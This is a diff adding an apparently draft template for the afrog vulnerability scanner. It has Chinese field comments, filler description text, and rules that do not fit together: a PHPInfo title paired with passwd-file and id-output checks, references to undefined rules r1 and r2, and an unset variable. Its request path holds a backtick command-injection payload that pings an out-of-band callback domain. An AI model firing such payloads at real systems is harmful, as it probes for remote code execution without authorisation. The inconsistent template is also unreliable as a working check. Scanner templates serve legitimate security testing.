@@ -1,0 +1,72 @@
+id: test # *
+
+info:
+  name: PHPInfo 信息泄露 # 漏洞名称，可以中文 *
+  author: zan8in # 作者 *
+  severity: info  # 漏洞等级 info、low、medium、high、critical *
+  description: | # 非必填 漏洞描述（包含 漏洞描述、漏洞影响、网络测绘、修复建议 等）
+    adsfasfadsfadsf
+    afsdasddas
+    adfsadsfasd
+    afsdasddasfadssfa
+    afsdasddasfadssfaafsddaf
+    fadsasfasd
+  reference: # 非必填 参考链接
+    - https://gitee.com/zanbin/afrog/tree/main/pocs/afrog-pocs
+
+set:
+  md5str: base64('admin:admin')
+
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+  reverseDomain: reverse.url.domain
+  
+rules: # 规则组合 *
+  r0: # 规则1 *
+    request: # 请求 *
+      method: GET  # 请求方法(GET、POST、PUT、DELETE、OPTIONS) *
+      path: /doAs?=`ping {{reverseDomain}}` # URL 路径 *
+      headers:
+        Authorization: Basic {{adminb64}}
+    expression: | # 表达式 *
+      response.status == 200 
+      && response.body.bcontains(b'<h1 class="p">PHP Version')
+      && response.headers["content-type"].contains('text/html')
+      && response.content_type.contains('text/html')
+      && response.raw_header.bcontains(b'text/html')
+      && response.raw.bcontains(b'text/html')
+      && response.body.ibcontains(b'<title>phpmyadmin</title>')
+      && "root:[x*]?:0:0:".bmatches(response.body)
+      && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
+      && reverse.wait(5)
+expression: r0() || r1() || r2() # *
+  
+# message Response {
+#   UrlType url = 1;  // response.url(UrlType)自定义类型 UrlType, 请查看下方 UrlType 的说明
+#   int32 status = 2; // response.status(int)返回包的satus code
+#   map<string, string> headers = 3;  // response.headers(map[string]string)返回包的HTTP头，类似 request.headers。
+#   string content_type = 4;  // response.content_type(string)返回包的content-type头的值
+#   bytes body = 5;  // response.body([]byte)返回包的Body，因为是一个字节流（bytes）而非字符串，后面判断的时候需要使用字节流相关的方法
+#   int64 latency = 6;  // response.latency(int)响应的延迟时间，可以用于 sql 时间盲注的判断，单位毫秒 (ms)
+#   ConnInfoType conn = 7;  // response.conn(connInfoType)连接相关信息
+#   bytes raw = 8; // response.raw([]byte)原始响应
+#   bytes raw_header = 9;  // response.raw_header([]byte)原始的 header 部分，需要使用字节流相关方法来判断。
+# }
+
+# bcontains   （字节流）包含 区分大小写
+# ibcontains   （字节流）包含 不区分大小写
+
+# icontains   （字符串）包含 不区分大小写
+# contains     （字符串）包含 区分大小写
+
+# md5     
+# base64
+# base64Decode
+# urlencode
+# urldecode
+# randomInt(n)      生成n长度数字
+# randomLowercase(n)  生成n长度字符串（小写）
+
+
+
+
